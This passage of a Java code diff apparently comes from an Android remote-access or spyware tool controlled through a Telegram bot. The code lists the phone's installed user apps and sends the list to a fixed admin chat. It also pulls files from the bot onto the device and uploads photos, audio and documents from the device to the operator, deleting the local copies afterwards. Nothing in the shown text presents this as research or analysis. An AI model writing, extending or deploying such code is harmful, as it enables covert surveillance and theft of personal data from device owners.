+                PackageManager pm = context.getPackageManager();
+                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+                StringBuilder appList = new StringBuilder();
+                int count = 0;
+                for (ApplicationInfo app : packages) {
+                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                        appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
+                        count++;
+                    }
+                }
+                sendMessage("*--- " + count + " User Apps ---*\n" + appList.toString(), context);
+            } catch (Exception e) { sendMessage("Failed to list apps.", context); }
+        }).start();
+    }
+    
+    private JSONObject createButton(String text, String callbackData) throws org.json.JSONException {
+        return new JSONObject().put("text", text).put("callback_data", callbackData);
+    }
+    
+    private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
+        new Thread(() -> {
+            try {
+                String token = ConfigLoader.getBotToken();
+                String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId;
+                String response = streamToString(new URL(getPathUrl).openConnection().getInputStream());
+                String filePath = new JSONObject(response).getJSONObject("result").getString("file_path");
+                String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath;
+                File outputFile = new File(context.getCacheDir(), fileName);
+                try (InputStream is = new URL(downloadUrl).openConnection().getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) {
+                    byte[] buffer = new byte[8192]; int bytesRead;
+                    while ((bytesRead = is.read(buffer)) != -1) fos.write(buffer, 0, bytesRead);
+                }
+                callback.onFileDownloaded(outputFile.getAbsolutePath());
+            } catch (Exception e) { ErrorLogger.logError(context, "FileDownloadError", e); }
+        }).start();
+    }
+
     private interface FileDownloadCallback { void onFileDownloaded(String path); }
-    private static String streamToString(InputStream is) throws Exception { ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length; while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length); return result.toString("UTF-8"); }
-    private void answerCallbackQuery(String callbackQueryId) { try { post("answerCallbackQuery", new JSONObject().put("callback_query_id", callbackQueryId), context); } catch (Exception e) { /* Failsafe */ } }
-    private void editMessage(long chatId, int messageId, String text) { try { JSONObject body = new JSONObject().put("chat_id", chatId).put("message_id", messageId).put("text", text).put("reply_markup", new JSONObject()).put("parse_mode", "Markdown"); post("editMessageText", body, context); } catch (Exception e) { ErrorLogger.logError(context, "EditMessage", e); } }
-    private void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup) { try { JSONObject body = new JSONObject().put("chat_id", chatId).put("message_id", messageId).put("text", text).put("reply_markup", markup).put("parse_mode", "Markdown"); post("editMessageText", body, context); } catch (Exception e) { ErrorLogger.logError(context, "EditMarkup", e); } }
-    private void sendMessageWithMarkup(String text, JSONObject markup) { try { JSONObject body = new JSONObject().put("chat_id", ConfigLoader.getAdminId()).put("text", text).put("reply_markup", markup).put("parse_mode", "Markdown"); post("sendMessage", body, context); } catch (Exception e) { ErrorLogger.logError(context, "SendMessageWithMarkup", e); } }
-    public static void sendMessage(String message, Context context) { if (message.length() > 4000) { for (int i = 0; i < message.length(); i += 4000) { sendMessageChunk(message.substring(i, Math.min(i + 4000, message.length())), context); } } else { sendMessageChunk(message, context); } }
-    private static void sendMessageChunk(String message, Context context) { try { JSONObject body = new JSONObject().put("chat_id", ConfigLoader.getAdminId()).put("text", message).put("parse_mode", "Markdown"); post("sendMessage", body, context); } catch (Exception e) { ErrorLogger.logError(context, "SendMessageHelper", e); } }
-    public static void post(String method, JSONObject json, Context context) { new Thread(() -> { try { URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/" + method); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod("POST"); conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8"); conn.setDoOutput(true); try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes(StandardCharsets.UTF_8)); } conn.getInputStream().close(); conn.disconnect(); } catch (Exception e) { ErrorLogger.logError(context, "Post", e); } }).start(); }
-    public static void uploadPhoto(String filePath, long chatId, String caption, Context context) { uploadMultipart(filePath, chatId, caption, context, "sendPhoto", "photo", "image/jpeg"); }
-    public static void uploadAudio(String filePath, long chatId, String caption, Context context) { uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4"); }
-    public static void uploadDocument(String filePath, long chatId, String caption, Context context) { uploadMultipart(filePath, chatId, caption, context, "sendDocument", "document", "application/octet-stream"); }
-    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) { final File fileToUpload = new File(filePath); if (!fileToUpload.exists()) return; new Thread(() -> { HttpURLConnection conn = null; try { String token = ConfigLoader.getBotToken(); String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint; String boundary = "Boundary-" + System.currentTimeMillis(), LINE_FEED = "\r\n"; conn = (HttpURLConnection) new URL(urlStr).openConnection(); conn.setDoOutput(true); conn.setRequestMethod("POST"); conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary); try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) { writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED); writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED); writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED); writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED).flush(); try (FileInputStream fis = new FileInputStream(fileToUpload)) { byte[] buffer = new byte[8192]; int bytesRead; while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead); } writer.append(LINE_FEED).flush(); writer.append("--" + boundary + "--").append(LINE_FEED); } conn.getInputStream().close(); } catch (Exception e) { ErrorLogger.logError(context, "Upload", e); } finally { if (conn != null) conn.disconnect(); fileToUpload.delete(); } }).start(); }
+
+    private static String streamToString(InputStream is) throws Exception {
+        ByteArrayOutputStream result = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int length;
+        while ((length = is.read(buffer)) != -1) result.write(buffer, 0, length);
+        return result.toString("UTF-8");
+    }
+    
+    private void answerCallbackQuery(String callbackQueryId) {
+        try { post("answerCallbackQuery", new JSONObject().put("callback_query_id", callbackQueryId), context); }
+        catch (Exception e) { /* Failsafe */ }
+    }
+
+    private void editMessage(long chatId, int messageId, String text) {
+        try {
+            JSONObject body = new JSONObject().put("chat_id", chatId).put("message_id", messageId).put("text", text).put("reply_markup", new JSONObject()).put("parse_mode", "Markdown");
+            post("editMessageText", body, context);
+        } catch (Exception e) { ErrorLogger.logError(context, "EditMessage", e); }
+    }
+
+    private void editMessageMarkup(long chatId, int messageId, String text, JSONObject markup) {
+        try {
+            JSONObject body = new JSONObject().put("chat_id", chatId).put("message_id", messageId).put("text", text).put("reply_markup", markup).put("parse_mode", "Markdown");
+            post("editMessageText", body, context);
+        } catch (Exception e) { ErrorLogger.logError(context, "EditMarkup", e); }
+    }
+
+    private void sendMessageWithMarkup(String text, JSONObject markup) {
+        try {
+            JSONObject body = new JSONObject().put("chat_id", ConfigLoader.getAdminId()).put("text", text).put("reply_markup", markup).put("parse_mode", "Markdown");
+            post("sendMessage", body, context);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageWithMarkup", e); }
+    }
+
+    public static void sendMessage(String message, Context context) {
+        if (message.length() > 4000) {
+            for (int i = 0; i < message.length(); i += 4000) {
+                sendMessageChunk(message.substring(i, Math.min(i + 4000, message.length())), context);
+            }
+        } else {
+            sendMessageChunk(message, context);
+        }
+    }
+
+    private static void sendMessageChunk(String message, Context context) {
+        try {
+            JSONObject body = new JSONObject().put("chat_id", ConfigLoader.getAdminId()).put("text", message).put("parse_mode", "Markdown");
+            post("sendMessage", body, context);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMessageHelper", e); }
+    }
+
+    public static void post(String method, JSONObject json, Context context) {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/" + method);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                conn.setDoOutput(true);
+                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes(StandardCharsets.UTF_8)); }
+                conn.getInputStream().close();
+                conn.disconnect();
+            } catch (Exception e) { ErrorLogger.logError(context, "Post", e); }
+        }).start();
+    }
+    
+    public static void uploadPhoto(String filePath, long chatId, String caption, Context context) {
+        uploadMultipart(filePath, chatId, caption, context, "sendPhoto", "photo", "image/jpeg");
+    }
+
+    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
+        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
+    }
+    
+    public static void uploadDocument(String filePath, long chatId, String caption, Context context) {
+        uploadMultipart(filePath, chatId, caption, context, "sendDocument", "document", "application/octet-stream");
+    }
+
+    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
+        final File fileToUpload = new File(filePath);
+        if (!fileToUpload.exists()) return;
+        new Thread(() -> {
+            HttpURLConnection conn = null;
+            try {
+                String token = ConfigLoader.getBotToken();
+                String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
+                String boundary = "Boundary-" + System.currentTimeMillis(), LINE_FEED = "\r\n";
+                conn = (HttpURLConnection) new URL(urlStr).openConnection();
+                conn.setDoOutput(true);
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
+                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED);
+                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED);
+                    writer.append("--" + boundary).append(LINE_FEED).append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
+                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED).flush();
+                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
+                        byte[] buffer = new byte[8192]; int bytesRead;
+                        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
+                    }
+                    writer.append(LINE_FEED).flush();
+                    writer.append("--" + boundary + "--").append(LINE_FEED);
+                }
+                conn.getInputStream().close();
+            } catch (Exception e) { ErrorLogger.logError(context, "Upload", e);
+            } finally { if (conn != null) conn.disconnect(); fileToUpload.delete(); }
+        }).start();
+    }
 }
